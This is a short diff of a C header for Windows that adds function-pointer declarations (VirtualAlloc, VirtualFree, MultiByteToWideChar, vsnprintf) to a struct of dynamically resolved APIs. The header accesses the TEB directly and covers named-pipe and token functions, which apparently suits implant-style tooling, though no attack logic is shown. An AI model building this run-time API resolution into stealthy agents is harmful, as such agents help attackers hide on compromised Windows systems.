@@ -5,12 +5,13 @@
 #include <psapi.h>
 #include "ntdll.h"
 
-
 extern void* __cdecl memset(void*, int, size_t);
 extern void* __cdecl memcpy(void*, const void*, size_t);
 
 #define TEB NtCurrentTeb()
 #define DECL_API(x) decltype(x) * x
+
+typedef int (*vsnprintf_t)(char* str, size_t size, const char* format, va_list args);
 
 struct WINAPIFUNC
 {
@@ -51,12 +52,15 @@ struct WINAPIFUNC
 	DECL_API(LocalFree);
 	DECL_API(LocalReAlloc);
 	DECL_API(MoveFileA);
+	DECL_API(MultiByteToWideChar);
 	DECL_API(PeekNamedPipe);
 	DECL_API(ReadFile);
 	DECL_API(RemoveDirectoryA);
 	DECL_API(RtlCaptureContext);
 	DECL_API(SetCurrentDirectoryA);
 	DECL_API(SetNamedPipeHandleState);
+	DECL_API(VirtualAlloc);
+	DECL_API(VirtualFree);
 	DECL_API(WideCharToMultiByte);
 	DECL_API(WriteFile);
 	
@@ -67,6 +71,8 @@ struct WINAPIFUNC
 	DECL_API(GetTokenInformation);
 	DECL_API(LookupAccountSidA);
 
+	// msvcrt
+	vsnprintf_t vsnprintf;
 };
 
 struct NTAPIFUNC
